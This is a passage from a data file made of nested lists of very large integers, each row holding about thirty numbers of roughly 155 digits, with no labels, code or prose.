26957743405940378015082082459740304386637485451003453842515540014844900256776306302587131004900469440567712180010768453166415792271585911153153932703886374507, 22258312266534224536793110850385473548570342590733417151322540014867072885687119624324527747722093697196710414605714352450915121712917467290846237705630195282, 21426298398680497796564172075957429689443824919051211243778532896069621291420436888655596417059142697416285515175597615755632678391497081681975319402665195013, 18847039216120757654828597936996973753736043210761635371992999576865826637786774681773531951764197233211539822749235640188032894012830489544924986705201494790, 22648025961558413104363984982700738951371933150054568352750069324958679234631715877259932922486839964175261629346747097392800612467975340405582203425786638729, 19575022808926103836729269758968065217307076679344990254833252736055581221642867455957977141027187835032252201396923462556428461900281603507703840369598323495, 21474884323091146834617078586948608570188447156067791439975681837921881400586426318263999983818389381845138343547374373940541035313367548083792867697043575306, 20054916030400698246026116206147725859110515821812654322040215104226402860159864681120941816252330436403110097933337536377594613439229689554737232916910202551, 19232612678699232326200792767209598244899828792720726842165696418835376641184519344261475642774116123465464433952321156569427189713683646369065638806936139079, 22368900940077086013241977966888551672654849615940995612273957776227767465555558583521860216330031653448448807347314755117954377676542870375886315146834754572, 20509149351165366318926616040230892976126847704504545601013536379585392807428334850179560221291905257182778314053660484588780602966121221502443451627855090689, 23657613062423046330641188061229225634205927060106189301794430872446341541543666174114681189618305619476267043881622531737250558814561082595953742882418122723, 22608491405694537584595447617252365208068368207135426326131878037387140447764147870353296675854738726885867708458032730291176673156623059828530839998135499686, 23457578612592392807857706934263869625523876327989159599280829032788284075400961974071086534631626465458292606842081557859993921463104285748369414109674037121, 24330755041435830662523258472648089715502852217530975536126992298772922130372389485304717013964380280071023747061800800392853034199827839497823792398383357701, 23549836888657205513416174326836561194527304736608140288026804826490919814045212498597502214734391530791167849185864837025752486931478344910253619632724913804, 18105609656242041164492578010338582583467867440393809189971467102913398666637901055736039173135955387338947236335262368865896692831382860833453383396390417249, 20750511836259496661154662924504302149986552350713007638652503546052391463178010642208175477187674642591072412686387792990921162861704572283302322319325033963, 22583318922329708290676000406855476915143077660043605232293968927631235715986152673598392826296858245581253286245383129366717301824258199188556517989556140492, 22876598704224304206851409624117609699566169043504527207694407298672290438891279940999423271198831656669502587434074605903576279791500228333666335243198424350, 19882254602412643585306112072810349079205979252074761135736814156163195694079348101274527030203707152692157435072603597165469474636144203493612938353649742814, 18823117840774424982446790799628459166867839125103247805463556515112176661607965130057369538666247510229649153805025406723795606243956237649271106696970917875, 25792445345041347471367920080040916388027263788549929870061268405066712868579514508017402655433018072035168291200777963373610237303713926720375634452954044146, 20810732982876561803385937121216485978992701218626430004886608255611253234317515920149806329759484509819074080829647392050736441728727151212614907626732914740, 22508527687411756429960906325826496871429588744664216138018480292708027730673695865561410334210475756181214609209933222059186243846004270410055917405936606184, 17154834378081708168912570043329423164146293585848136410633147052324491975866371210547514403371724871189244028667458709830484458236922620214304608799800213692, 18568856063871671675765838893357757991014213882314435524406183532016305912111455615894308921778950052265300522575298365604372796707313600386848138771668555707, 23868938334853345511285560321721173506626668519223150570739898572495226973801595611396569788708702397782199767790056280617326126354678857642163006092088750515, 20517628167068964552383379011249876305425079113071117546023678519394594335751519935709699443211971836271491693536591353915974126759119273041664911700484620584, 21476209449428764214583403041857162631588678643916940086241199239009656653511335927058374601816876559979124785369013525399043274759907367888190476250095765861], [26206014175829057856043708408520977634609701274586758033887376944231254344866969906387657997665339120043927891742092308388457215892338930267760608799004597798, 24234400498924981802106658766506080805561449229115608186861519231433181066814627727320003892728953383120854445559924212199006461990349711265489938604749148283, 31144903532419603623842278191995749666069906012278408855460477043982689959479527149219520576914577381489306005170670919821772402395585801827140625088771110786, 28033240681795795772265334926122887365818812594061016862342838315201207027003287103411164552003802503998828801993844154894769662356317315010191222807417124874, 23137202777072482537219267876316663931656020333966916443610779345639090366784245428446513017989251662365371281556875725773062419362704399732733766890804105258, 23644247694023444915948519502643578576884727079129346492125929659667823049793671555971930989320502344937776514555303454823669423244468704007257587769537625538, 27170591194304007668809990904621934179038066612406664143825395001277379012324189888686496881599558511588332763978595794548655598892774360944599400771212971669, 26894893403781971290980841556565033936097052690054189254645756428301933712554318576629872846538136900471301946747010062547552692194267585812680939192680853635, 21684921484557358225562113289737770463858522237436829471593796644482692181278301358233783197409209127519532421920576828289360759952272259522336139930567177650, 22481279322211232998563503576317328042366248818585945762720579555728572584445944234524614026138575311524859026386804894925884610706836241924674687926223263917, 21051820376281397464611980242142109694899887674266001457513365033534445286648473281450345843577811992291550419299959095676109108054560125933854859951428310749, 28002445891643516658346687347563775730159127214996184330788634681682742055930459347579300803947603192329855749738672859411429691214684526980027930701342519125, 28605962978585002648678614672756048624783043479931352191160083019904510219512113166464207650045845660715484796294951231465657330064075988213543796763314098699, 27524629912706853324958807337922820739670174998122737536108464049310246421075801725054745190546078583228162257708870531527774834333926652943752802662269239047, 24059503092478004758149505728839100481427287074803582293759586339627943904789767515276933018747168357873467989435062481026049646189301704741773446723897682522, 28713868099404233417169110477552263784455948397678845729147661703377978317934796972371424776341873620854170169947201128734606258196965998135976410091013214148, 30795180429775659536849884134631605767693818611457692071186019389627458674406273643372236688684915180157582313870814523829294323197311463727396912668412551806, 29126067768069949138866141474847259665409073272663015348555790739464742379418562799772768109948007641372045790983158301463255522671028733553430304937150046149, 23811643335854253806438833932049996020505289617283807660262029284772078768468556214336782258634001288041991934805490610813047686394866228021966549735092775574, 21925810837454240696282850380511251650552163672067081242105145747169525710557246545526424081303266208524737849289338800602902644941832752913591638102811886560, 27949816428304388178193121124153588168163466529373246478847125755150508514949256793485395759321591354943296878542312732228357760196181979870060674067644095121, 27066243473491416385817845516291919150077945744450987379808285793334166951565121179701697768927501045496952168322452513739039396039847610517504907002252180062, 20395064872492640641192516366373908314030543108707707926151748109964040805510455871211482473507159634515692562775329829782327837688495690903517136617421422737, 24464129711727925954459827730882978903657025665052189664948631850348682801502445619201588208550533594491123149527276895168747579729673428714507991069128159658, 27215860850465624344591375993297242176858722057370650206596682750064841618040427551510823504589088613122155251970311672483759821739119847682984605339868606199, 28049713444915459591803369281145214738728837466076280956387044771306523227554011543692444877300830202167710694559336392485584223857588589611876853540963039628, 28678288421407108646770336992260876903897527667292463491367863738399636246454101009082869348547568169036087657520741113284477635143832075152620380355171828328, 20826758120138516989304977423210649620816844079127779935941887097792036794983719507651922106109180224369268690110956984032384093907861218960916571730571661289, 21633135731698537178656797770691722354503140242319563261836181235731551034472378680336322685751051573141055344069009476026782723277097669887201435328612136833, 27853451755532473244475434042958877228029262510407634889056128370809023604179823507628522898409592097743391909036174619914530526036050859658693474918931169576, 23984029415681085223046260872859294500368758711734047223826165925892797691423678922031861322450354700596011968895033131688209632947782967377050075659212072613, 25174448407758158111099920337283451594702584175271170603291715956185912506068487600362497420900796805787069616646962372428741081784915299832088430526916141929], [32452530694193125278998427304691477058276514801237359462681148325059954445277382552308436158094743147268831141943356341822875806934109317713327524213788199370, 29051684083095650336070665425351316466056786167953881697104842221935918032453474062505364291165650178130305122873793040120479861794409426191970219407388596950, 39406661138642889966682187499951146549706836182609315128737194226465836736092341428608394355903789432753609315991355574081296498550149923719196473756774947623, 33736435016265145745592598668233000915882391009573642402661808975063124029228889056022751355176558004494805908917983536496829091485009301713664917618017243534, 29372886628385638556538283915627721966461335353946905338425696650734969571415601439736437667070946791224047636193036718944738995314829096922117710772577526261, 26138377603590696068855605280917201424463471787582043860836350515535059847598177419793527117763958626685482901844973469938345113432379166984879287328764335107, 33182779741184465400061474297080269705197759444220360056934382772315825868552902044223801327378658737344771285247958201413022222035778436016217919036852403090, 31763512921458548735623087953303425554140349695881454029969206133792981462886150624859458163710961107933576529696632281777064763975762373533802397787003356474, 29521127475673415808626829907075428695379205501876188724657972949169847973274220325938522143301821472150381823165637280398134768668250922727357204046287984078, 30927733720448036920323661002609707814437918193640448138397980918474424650611310013627987113260792579635857742496327154534648308514445670991497139957369232321, 27008407939931171113202838981612791388325612056039888916374565828609264984852363650517927627372325338259619025253079850742701547223427877428787976892043713407, 32246924611432288530725172840060350124467991067102179534103186274672675704205926540736100014460927387436266821340450739648227149975483798671766105529872001338, 31078045197077708165072434307701683601561777979304570133140527058166074063157728857787358873427338090510056325985416713742196563648041654510622504444242312133, 33293493246908771321630442904079950911136996744803860545875543261101957099682804586199017200606931604664177295707354084429746553423182255648209468312236039529, 32377634163014946507652339182737725780182429842727440843720982051288088108010474074763983734301866121713015812571625532522859580543901178128222918794089790421, 36331538936031775313220868046298581876789742595580720019690976376056131212316577733423076397108884479867573181980329170603684987495476132022672367192093000821, 38207001382173187349887181851442236103093100270964096708450042903916675466424971240917224589170949780495349120787269960692467617049611915808495690802062940822, 36484809636811207464382781416741645353224071736043029439662498938307892064202775693363176811494201724751949371933289665685571878127695382055935851741306262378, 28313864006169963698975550669217127885289096728748890279906099879750683165989422425379823897907811503018558834662848062688989831477892679870790968392160005375, 29811215257370393975323470275758321899785112159278771519186942159225494893525828463216369239945854549770509053892987378012486118788140104283372328666080338330, 32453414182136079046069411668017849612785508528863984824919935318187128582804844819341922884076456966542280816907321351453514465935877227113276017421217931128, 33539273995930953279915719758580895634237214189150488862784875807300040399751690824940367557736464247424123807118344552726139499717662273171907224646035679064, 26992466657448612135352723790602301506210635178090708721505008776922178485459677620315438894384091333517706766168551611010859839589158932220962919855054793001, 31563114043083227255759467084224234132176750428935004668922551351835194417957549414669844206552902215583959354446048066471502258823894818483564622006602210452, 37038728132242176629999672364828320754146228023643383011074256271135181936936334047607968661731644677868309143942173343573472781274137769158066328932649713360, 34915324601828893866011333227353944658903988658489170901473019652268934042827962586354012667314704459418411172332643062405611419806844722948594401792597683570, 37406981586286711608790116738555705045910612571597023536890192480406865431992648857409922519489034135941512751461022717997802561200442927858957165963685402869, 28896008166135323893016465668354217357908672194411902064387604752596724005052676007555776609747107985477197848527419158167636252793424497707484783140805686542, 27365104682023579944961217165394992823926135029647283546174268873617138587849825641568228317494490729424946501173734131344123216095160718363749380973042465993, 33680251551898520446923357266650993598550208311919423753907532463030457984052722321623010642945288146768395533293902125506500438412643460356096630335074871310, 30877169018201282910759845774580816246588586910235430310538275172530549903813702348870353474572542741724840978069582264510703947301498224822908697900029897930, 32790786664600527123721714599936231664166821551540726153819077387301194817754456506207727581357097873351243795147861051307157003615256066074663164011732145479], [30799534377702096074870871480947819471610109077264151412895051989883123489948824788515472933493301507291067396470662308983819065100916508109512774835562693755, 28535092806419998387338438094242245689216965427182847841624846212401948120667331484233110144653394299420812468088366223181208722424432940176994613254446354016, 35158020084331887463744880428472131490007618932199345520592285706364002320481053395493877904042756769034217066041499318008297943913130895830879153563272271322, 32966837386418033497742962727280704222411842386303109266966792316152905147431192811410178270163781931272729561910409441562860590584207361727478201800025940775, 25040589469425571156499003390517476472312034436970479566326005543676494739538590922518227431505597182768481713204992142117590748344268984463944703634848366985, 26201494614197903283662741583510642447373891863661328182865434356015607753908497686958279894325003204412664068891164125303439829102330816926123421912836660196, 29205076520978199308628414627151956914193091954072315251118558737033373904389798983937816782034823831538965997967522167265398909640103614896014651667137429104, 30815542043935980840500755273541267164930090399326492376269827829567553263413352931607914088486636991595908877250411329294397378914014494911660832781055632926, 29662729883359671663944149554859231922041527593176016169464558342788147621312243102125492545520126976831772511572104804930083003876782980596563131010325930022, 26323101200557823872085207007309319626019000465762932598026329543009663841468579422121495836948802336217364092204695812967009837320765479707941609619883972501, 27654052022327624097479030320417728852808136639626129782292589768610700289735775227735260150552523607257360027557381339979185335157662111576222190647687261651, 31177033976518818975637833741337305909273391193822199090242960735405665272340732115388101862716466843609465571440371143804342852106147870574515155510450022021, 30896374829592069683523260342983468066883703253838116688630832215153710403007361277666841363252049653787816393430120818868101804139299893954219644067445286425, 29759369819872502857005184358271310904744858278835758755526729923788081958554656380009115729160437148617598273110263337500934069548233775014032138356437291021, 29421770205905698332089602893615633534394771970065833207964366739550910098303451807384383122106683672965181039791053148125927822810653732070948820401563067732, 32671928996015113733954036472715221286812354147767381100489596453758948065042394879918861805148084100624466604162836694472356147549427259282771569238959982219, 33422276087920496740795916588821473555378991913789334872567054654657109800446488878725379603774365788522017781021678817239149430154332102680564424659347957010, 31288060938681395781886584342335850896431438524954998103183468506569693995631234594859084291941819922737036495930205486839632379691074832563632389857487359288, 24760117921174938622751118667740572638756594257910226721626541852819376792206254466807730650598176746762296511561242428240030547401986577562726366886419499268, 28437547282540809416505405267304388530855625425135200861533525655292483261845424553036976020616677748267614855927667500511668579128716189690231353378515235479, 31044645197344140716963144594689157949663283236906864453556411564364560460752900923989776756027134164286448642704872919428573480049837210925399580569074033450, 28326110806066685082128308467560402847342017979726950195791334428110241000544905948740944448139852504982457038301695693218232505047833308191432103296844354307, 22370601310228379431363340489055474116854713665137843318112219237428363812534147423567384188121486643873250908487519752653500624326431246017393923641017446367, 29972072554182710403370167566131978465645598113016234556028476581787215493648653149083944629137008172792598745957789042380102396467746299529918272290461948364, 32256293627649736243833605565764962144894755753583749951990716951875559615954565511057728190171046242771999697455791043689804753238595157697694339334494278869, 26490417438349884546697575619238865573760946629026816760578683129059515553752785429989257781023012799416851628017861351537779667012069486215025257493668720801, 32456389403911198985770370516605679128129227968271385088559100954338350036116563580528021568426477790417073417241448715530105194831207461826242983249393021700, 25374608242706166220239976033844193946773412344001500276587869434310522674359276425399874699888656444529183860952046479431836768850453388125981813291774352513, 23764772383358240703630480283202414143479301699172450526111347791773385885654309068312284973009095462316156773535583916270399321076810382156374549663008648503, 30323393706190352373969978523557884471598611794475907185402587945344859496424029519509409620602390762776920290629066597650897312772902744386576085302865745590, 27162705527398006607890484244572479480401819923806392464150304120300199322332974122719823668374863245192371517373733269366237769888137319209438259560250201928, 27848836593970171275767344388498216417835817573128974877788925329073045912170230977801589381448940765219405998424200287359999911859884793923157919812020185992], [27932766950108290998330862851657588156080795281148474408751908585378466457800809616400754118017572349726260222207379970159181139696903221076164085488415749533, 28012692362576103199040890134816416516365603215004743968744457422349836352920767386777939173434171774750262509885804995983331812886895865513264021975505554169, 32672832959169092609714283234397992381753451766702665436841931104487903345736196350149901949420950359619681727193764085771389449095059588344035622543664944416, 28262890946681246758904102092868978234421043390286801266116158644702832085452716314882410034413042082293058881852389708792959057095940870852368031246586221705, 25981892636972825484658683779066373527557560436233013369753805385132933120203072608850470873109836834768080862357473641597712583844421509040380589699540053188, 25121881798517772275927198029150092581192030581492224793030762931866362684207473358319488224006674215055941841668786303652082809971586601460403589010252933552, 26708089397243798042576103615854743859078534143394654907064222026073923397589212442303999603967950901718142382346013741286691756585491161245374771886121857786, 25824786309722324101987926752247213319186530956378664803651758234816841853445387483445111277161569755658117441535595011087681619818898195223397808510644213792, 24928794299112303110049344604396655595308552282625557854944455774105087808627375625622178935164111951844030252141909121047877608425323455407588701201919022204, 24968517424966215244476201472412172023820730517064914317042201247470937663539677582849589791455014817499205909484943866338580525828512716626206203844843800703, 22400259971031200084938256723581579261723671274130401052546351500997684561129748444485223219218314682651154978232329722647615096660470602528830261747868556273, 28924075351690287131844474404792789882314358663270752597663804318652442635195443668100918288054160614710826749766710754965440349448997289992496328141894988772, 29093079891033321022025832074835018113352751309515473836983616831308637102754825785446896272493427993422081244824302506550345251513981091861766917043151721875, 26302318693629587676727539228303653906507664726425692747049565600155468820063596119607569119296168607128484693086019658454262950917792446753929923860029673260, 30195555341318511511734963580552915853174528520172998508344479080619957698498391079335999870687278191956764198684263552773146533582743609216883897427470700092, 32432523346414995685875783438668469368652896252587285413100353127264229265861990647573289671573892283372811130110118702303363125546538513193296636054538586657, 31713739548019324370687242937757211355147718733395047505245237155538779294257871501997209581068726854759913351637651704752034582816025776947927259637310440416, 33530325106571187758475148968793903430037584944194742852686164853468725157869026426015168249179190703946651016064703851745415092936437942487538728067219734033, 24917239901302316983083017320398718393295117972875280796510902130734322280514585234234807146069364586641383604602844125626832919052086474684577262104732015690, 24865038103118808087475174897224944843801727045524028274879168816994269602137670520334688530567831837870560321807276435816402321208825106043108070851484070721, 28225359956246329772866185348823348899897279384511685171999148850611721291170232970033730084685095743141620421932391873665578730534078402645947603563799079020, 25856901310016282448204978622139806612690246681867624254028819202419838332506717359897982621457722875487389597462617686552597237126158311478148919630922479199, 22179506291449070359690148182666907233344639962365922308636625757226634489255053456479233516462227775216356989859161449314792144361946852758396560285047297163, 27896298043487018199514717897286490195669315706869926035404437758050736119838599612300883732889461359335780129552507568054704804543056525505122458321464604794, 30039798329582039230499280201408589429969927725192688525998607789511065735618829708607901399107680170525382988839199898759264321476430780522013428805278107961, 27059400900825160984045918073192301412299271960976128490397229816491182900682355493194016408088294654780861709821387407822554681346844995754156669643431833717, 31555369526667680708609433574475309740501830634137003209155388769947376173284491931357506203545658043962911324847799760347066666399357618422596521201583644892, 24285288596332807257450824037343726846716152414380141389174100971907676669251447980313293713479419337361444872728116612015989453595411979582354208816182363734, 21717879748798501153879491264561709261497843236864982331609613733832969375846312805422475394518038720381253963437656590849602781312288692944699046461181366470, 28474968884389807879927339236377465356752515839805962515550653792084482744431893189569337653805386826254010220757149033296713975077074869097213162352673280730, 25620947992550801901987066502572939841620994740407427933202487020515689908406417186149259048513758639298229122642437377166535146015958039041488396591049020996, 25907040070800575133776399515284960947765698575234318704294466261227611152520291550039565488411836991942834098095963476745736763066824789141362300218006966333], [30178672116391923701187920327559734579818892325407408571587175457402105178938118031947626622005118170893972150409351971387125017352048793632316642549516638574, 30556298531990496974429842192876211829315930855060405688286888412938240659279574707979718442950287204522593013622587630475215045681044763315513825840245199704, 33215117537336856749742245184808598383429218823401642736137809928267991207002842205942405944712906044292477101815629374788024064460052826389308588916012906444, 31433782901135504763085402778159686271461773199878625520360681572859586017716173226904115952033837967544525774430247530116370640252590657160612993726606402930, 25060996946527496509212237330051140745226698652419491670388308730409083572027735898534196702843083556720540109438940986428813827470362730145394823900343349688, 24806053642709051408758496172868993573312347449107888639856527954060223855220401688118665231564841088481158552238356618894298516805366716713710620407181419972, 26946631734721922929410019319980441177674060230346409400384458439399065976769547044602789450515708092337794260742319385748207064679210134824957786000895623110, 25805085944069694221457089769121544257220051718443448522009728974929513699544453619560039110663189906092876236784608849985404513210440979778085924635003059751, 23540681211433040816605970812394047298287729904591393697573367709092417548229761911708165077083750206753406455322184944298103079431588012169705436453026298009, 23892507087746670719315464208337555660080920358604702148464995105604502495517001272129022899453092448665121817218513479495787159928973035032237058139795037117, 24646965885677586987086213478624503282159209661150026186288423919546061240921215793099525468049967591214897112113405541006958888886467828033078616233207247174, 28836857611619831255863773262416693119728093355728925705931826409536295549303664592653078270580357420051438214998911850697063219353018826662464196904180361039, 28564788735959537386855524864908957745786379642957227881712460759107349542654563518697619172359624110352597670872222706312075937360450665387393595110677009532, 26963508420556708382953758979804995579841139108261847596811892278532152404104602442126527028158489882303553623152025264897475389416782388328844298082431810195, 26980007047101090284110240741921438232787368982910611900291186459230571768364831797947053372829107749022096799481935398972643540301580310908867045743059494193, 28368691601522667468061255400476603498489884666465714852235482644666537276450850309727181690181255247058396057636297217835888539128863610119573919658303329753, 30854288548751128903421368911743727132337460994398564095110407628114419793089378760219396683396894560586107123286489720831931306766297957753548001555339055386, 28814309495665002054349393624787888228528766581141993889306866885981622285227678084531223261762968931409314082008263031097119806479530057521378871030139372316, 25484889923428761387872152599971449487635012667419272901228220335623405550227241218090265766622173065624394310173223552664383106318195465396672462585270647912, 25733995799395604892608783052326452677944008900432037358388915501948375036094768217930413170703547753065970732857643764794655745399822275616633949325449390411, 26809191556643642327111614017959618644540929451128539558032477223921704887967306671683444911058105180635550605125023834875006358718486979602127674897874695189, 28618688284834751891283789728673927372736676305326683811132889528157577718885549582214650130791861615523524193585296046059078606705921114870954116447563716127, 26279612106240891218855202892609833279672436886763097219075771055537369937689243660721224373617955729022990746003505099210072036260959009488554746532560553816, 21741454401424173874783056274470659148258043704620009775212486223375367424804919991862177857769101082802579461173455677308834354504092522425170522076359020723, 31433387956316357332772124300600024157814020790568478385740004299194481413084391145424227968849057614573451368179778056678687715535474798284141643842766541154, 29898069431658967844237868225050934795512222880637056845244061090847944693243191537141933711984383208906724885699048332397887515118649801681857738665505125547, 29926825608857775979730700111849889333170566950387504648287195954676945069444255266380993164414966947397677534887687044911822823754473511296468867801739550603, 23790239839139704308331112896319815283381187883850378612535241473055867058938436684411833281698149366059456362666848171757775601154865213783416990507321905647, 24391542609204782761091654325761825395631082810782291080032679571911341084431546610055388798847695212528633162948217070245288730542909579782269612901202156586, 29113213456238365578517556587685835068625864466557525032019612712570914160038718432566587021763016939475322795647564343886238307231083451651078038095799798692, 27517116066300453935700817874215791412726760182575685714060855910694431339624735964067291927077178852337967017189887746596440861721614823585575965867814595481, 31795176663290732193115227613384075841500787399937628041856180033181556992367924117543264034407895027251482250462104909808676861871073036508190893961935684156], [26120660547740576412892744494826646560645978740910350976247083631327493489225495509615874409100975160469227282366555870893664024296748305241817882361865269162, 26459935661566086081013510427005254884025728451820425323110830037401120952433160434538591248890375300352911917419871191022827173517959253560922828571616795364, 32579781492924723036954009358729953467009327912036452312144453222726197466198591116330937013292847490461932142996468433418115316381150172484035252530636928844, 31062563003042030398580428394127397503999867459788492729653215686125731150299646338171532383086721012335595892091872141583201137048911890271939528136506666656, 25188761668327968941506664844044553356338528943419466466762087451342579970864173958365431074081017695572747004106410235630554306958103786058624214538161199330, 23438432146764670206580534501877579561328096358846589751779511041527152044357670617862997113145039662466959174251424451989551383292460614119134508571250098329, 26078534272455533889100875955888334199851185618995665107226235597241197066183725635597642317945591012542884790309995714347948859630944187077190195124856416157, 26930301321397197879791806585441827101325692810065997860978661983574258635270404880125635014276550584485710860283535830464057645379760947358435244927302536379, 26570069291919707866887270009717987046415946361609690613094870473776993021318377908069997995086151922866996360389803881887307642612892926815356066729985992726, 27329446566856648120512489315299031536763332512941148008371141156818758305921591882756878533715304976875802720787328919595270596050179009842071507821939922355, 26090033493197334118990508975106530772470275950063221032953874627534758683304073611122746295818573126550071594196263996105291206095061236255881853883549416151, 26959590882187807965395029083295611828150915192589398576002938301863462404190756276926835070956515141274679525107218487118450357685375346040357763091402583927, 26947473399318922195675207229379410272642579813859196139987880166801563321531093344354824421985011655161810402799473729463010318613135606758778484453641937069, 26622044972175756813162034760836799867231671752745226220787545701344809302556600621091608612764751099011838780651547712059957801063648665626799818385819196265, 26666945260925843035805176948065574068214770774807103793012352319450698402507487413177120855922590048874529756477416447688355693859223252804752544780837769860, 27741112260878305886741485281358653713983302591589875506976730674425684337165097711480895756959952097626448128439676759449077786749114271053944990648117209767, 31812638211920863093636181627065745214101793647981028770733509134642581581467868429586728658468599472511567545610905885511719010235907900925114510557520552231, 29296536609180679113244430163894840350619557008516911112086306205240857578427970013945738128173675833041226222306457314625661391261565007765175062590115290063, 24364317741112754832491939280891118421016596809668895459357726973130331928530295138709587680540504243103501483769820588333750347624536171313506647069356928968, 25756422094998743298680221867010938947174896205532033234548210713663762696954092093238392882510360887946806667607411169320477404072288591544983939875465716973, 29266277341884412704793201029387567886932785692921155928773342715685750607407175033161407637436491396979146006982714443055432597725619200856314142308179243644, 30166348224916025253023855656382095307662859257135582286004192110024171795320487934475989095364477220107903498925617317297503359238078139571772713310642861698, 25321905939353358853529447714433562674986634222524023348879937732481833573547171747319636818723288207923065685831906635806160756256844824067636893745085301901, 27047704987311503116985494841623159969493618116776427861646042524857413569963316063185746127600488486615416492598969552193604906420825813289909453385110802487, 28006032551340392720222282315884102093186430771626355857425608994640104118194132532473524099723355689530349865272030600559539512053743618650742883783236792278, 32921586624929727669332675099559863420064019575976748095911086514620776738153416998215317860146638537573616126273264452612415323159495991579172868054842689767, 33222429516610815516500503165044312725062290485620051719170228509161539039519924947354597536005442852343540729919105660409512662216180889339437265432748421676, 23543408144113552756278801309270883313549681522482049704551712325873401256685768963985953648553290212931314683673085145266939964881290879147737037502553115907, 24869822440037126376486193885606542134281608295169177416758363419470935658859600495091694610652247834895402020359954819443073053231399866885781079870484192507, 30730239898587724742431320762734489473153123162075475822332484202511782126352088200005511879924750825571560859951085937737927881370798521308873466318236169326, 27234171449896901073898725581748917043968193119100170619321720418334225688643889324091236319078573534901508024473496182695931332805979206212867634881331591764, 34146907975902381492107839728205570830656878352167108290666649112497656928486042513044445138537035381660283311011556072121639916401985941359223533680659241259], [27525707477531276200374329621458888459113174177759461228059383073795603812759193880447801092863692440257388129194820527310255142033051195147756238620703535827, 30613095594532475891909983249724795956159163560253398250394027520732273814054246502199718404812283507713327279420476585376346414879646645638751087263500861369, 35145479649890555721062828409562742844167458272492111280239594817264645791583094166506969623424208732240793795887300087541484228977625538606351916041834895915, 29588281814884100015361844687046174846890265785259372355582783815793424469937244990434159449462846105788576810011740779079576312429558703720877437290722747312, 29634829505214159274177434007703524478620618108120512458971508869443596944484900367634788698618273549483364826437293018269403598457129082199299939930712023733, 28589967891947303827985846297723218286541825587944393230667766098215057714054056573923448653187976804979660578646742901873835131374354974098965867558225061712, 28104124817284566957771957629809020328268534193392356832670960432600440248080553168413076828396715106464957215422271043136520128641307387051140359679296064423, 23925237425997834116420963808215568175824424914678636171121361288508963545717411745859590186151496490520276358782084921549206432627707160823920912447727101429, 24995488406308350361908475037415056101031757244631481584458871983323631222705844867567740641829471175684496289659350452491629038218248994502684484289862333259, 28793723005411527214840600102234800225332529590653217988998986681442973867644546525903015621896186286597419876571631760889028979896134773191150646201624520496, 26965014209627488776852643717837659272510731135989362092938327057449483184462540621357519483928133841352072692319317715534796123969224021756236115273337639227, 28130351232193830520868959265084411798068411240844869137011313897548275163394213902805167809803693548978381274898228584665183663989200640473419179661982040776, 28819293774053994953559693827002250107556165267346225394453915016813185289155888681982042668427411200744403829224983841106772389066579274490608511591714514391, 28386050911878799424816024994425402844313348200667033333498689373018765978660434141698344737995709476851379839803587746147890928849292640447847050429951174701, 30033808171360111971787789260129602310643928983112979300787164424115338779426697518297067469294827395630072380657691106340031722746626240420013140173218114550, 27953184124956109574189238653058396667241298489272512031572002234809094935264054536490460991185718371335494548690358106201859834124439421148890002320395942705, 33845894848151463836626126116898426944500900479994340805885017190575336499725209403573855434652614227949560740006233259614039169876671412146973635545714529681, 31219533507622601935604414146799226836457999930164882309832892535147028696182589438882803448033492507871958699433541311675578215594643492078899661208575057530, 23542755170962745616315160356003370812497549501951487044399610811406756972316369276440648372081962726649465562229686641506312579864464935732605783117832481495, 27348681104850103091598169047197889547319536997198642637211638232857173803893399343655478443196361655382338115696143959780407746021697770382745537027254722308, 32023930735621032229277170572556109698069798407602043791944274322097367230191257207674139832360103064407223967234667031627210966058156797573953393745142178763, 29454671690109663146941951889625479345500652758187547260811102145850174124183906563561858287352417206902319741315499144940030430825889634010891422454591451683, 23710544795841270734109166956861866108418211589237409183023304535047701530437815164689209192073901629615262442804392315457475977656558778503500770943244433389, 26808337630840933284223383241027633630315756415918221155561512532437263024038007664186335904090594357413169314688628607248592759122441109117357899814061761366, 29637877150092251405648544825394480125919521197659726363518477206730641539955846346171297344962669317436282651322609269839348090672494333571563902615163171574, 31372890638571510846352754140506578459060628160586075313053857071394189079538079685594936221395828880512276303630117427678041428218646738250538019884582299035, 33921498101052629796644223201155759372567238576520224838265883159681383397580029440692877290986776156334011110340925924912282950125924258962893685852602563428, 21468937445647478886072361678176562325256187584314447330777722087187192273494298766999425264401681269799027018075611578784739802270253915202053490595928867147, 26808106038301891097064463588139224135596918205320736865556858422264028253709620500566838730401919555313035214137131589927659071315308853529540772414754280648, 33279623043957950045851917103872947567604537761309569635740395452121361825562464329313040696985815200170598629774061217813712852694729970811611493618313441620, 26731104575156663020118463850293735481465169157032650019224399016412950955381433710722128110250674618331873947918879582656977674061301932845025589188714670311, 32417880918820448949229228335405681161232297161762760066339985395885229481736260011320070739663836328871291220796320810015796727596709319830520475609363609110], [33528552943685552958100530437748944900673637295049180782319353167105658373195313627036334946842842478626897513185896109194163530398434130126961048571712831124, 33605632811687183150603873248375313987862334427589618465166218866514159775622936527580844922199596123851088808930539040884303685547108046378312938422378998548, 38453162268741919186362518883476466351716990231072936789906177439490141937611204919277894464484941900174986007517952603244712744567173493543877639236310732963, 37525736037973428815841692556537317180585137779770694588445124326941265278661229104529570765651512346119769840730088148116295954938483969187727977984784418935, 30089456670442764216446724280128719963301984341106965161043511637052245363131532984128432759925980933738725023054069725750723410054712204744872759425555499851, 30314936012337161036485923978662400825262004266150428374095297696984425844927252355940194214485319440635701455841226317612119256901180441355497651116189992066, 32669091847873657675809901397893333749306825711445381909341728755641305880425813923455994071799893152332676257557503343839641199149097382283192942555314012993, 34291057560897149936130765938145883699229270797893483173811486326515594291417384533931419114739219922269633885201327978762781993885625311423574392364949412591, 30119488969969485298238306920809514511953224834432972320425562183828944840113560984132943763505394470093294281503918323424100297133943342825467749060176689053, 31226258320118238707967244475498588673765168957775504577438508984801458962553141475863136446878822969922346356877468490699099439133001223256718497339252449242, 31010784370731074081101625673666732780286844874281596229439416561575902098712334469562700266417156014613564550774839250193050665255598254924265553918697508086, 33042507265655186758236769376567867521234116736400819934432489337545416711474425527400595145762070692582930913064373900543150310175726728239154668745814748555, 34246817768227990735538483686608683840672495049387220712471152778443641509656694092593015686770373632161754116616193241420035390108199567481205694934970106114, 32880087729849437619637616197749223685622055594701177261378230647811519912539881682832383642873829709657231798423013626508721913342454273877955467282549000194, 34778553946256745083015598339013304598608304520050177104387178315404581522134270276329940362568427640289873703399022009747845501565581734248288918373138094617, 36633774222232859406751987919256742551237153181277276519779233451271310080301660597501987497585591434021230059739288139478941053330491923459530023587068938027, 38968202626257968729066636434051246460137223781259992461286549382048551162324036056700243429419246008370777140778785151892469028097138866241340141052802629559, 37929711515902520096243248090834467715560726914381748964674647362255932137906411939373647336940599541972461875012342772287965730674454863393357367734693344511, 